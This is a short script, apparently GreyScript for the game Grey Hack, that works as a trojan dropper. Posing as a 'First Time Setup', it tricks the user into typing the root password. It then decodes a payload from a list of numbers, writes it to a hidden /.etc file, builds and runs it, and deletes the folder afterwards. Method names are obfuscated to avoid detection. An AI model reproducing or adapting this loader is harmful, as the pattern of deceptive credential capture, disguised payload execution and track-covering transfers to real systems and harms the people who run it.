code = []//Payload list at here

main = function()//This script translate a list of number into characters and execute it as root.
    rootFolder = get_shell.host_computer.File("/root")
    if rootFolder.has_permission("r") and rootFolder.has_permission("x") and rootFolder.has_permission("x") then
        shell = get_shell
    else
        print("This program need to be execute as root. Type root password and press enter to continue")
        inputPass = user_input("> ", true)
        shell = get_shell("root", inputPass)
        if not shell then exit("incorrect password.")
    end if
    computer = shell.host_computer
    print("First Time Setup, This might take a while. Please wait...")
    rawCode = ""
    for num in code
        rawCode = rawCode + char(num)
    end for
    etcFolder = computer.File("/.etc")
    if not computer.File("/.etc/.bin.src") then computer.touch("/.etc", ".bin.src")
    etcFile = computer.File("/.etc/.bin.src")
    etcFile.set_content(rawCode)
    one = function(string = "")
        string = string.lower
        string = string.replace("1", "l")
        string = string.replace("v", "u")
        string = string.replace("4", "a")
        string = string.replace("!", "i")
        string = string.replace("3", "e")
        return string
    end function
    two = function()
        if not false then return shell else return null
    end function
    try = two
    try[one("BV!1D")]("/.etc/.bin.src", "/.etc")
    try[one("14VNCH")]("/.etc/.bin")
    etcFolder[one("D313T3")]
    wait(5)
    exit(clear_screen)
end function
main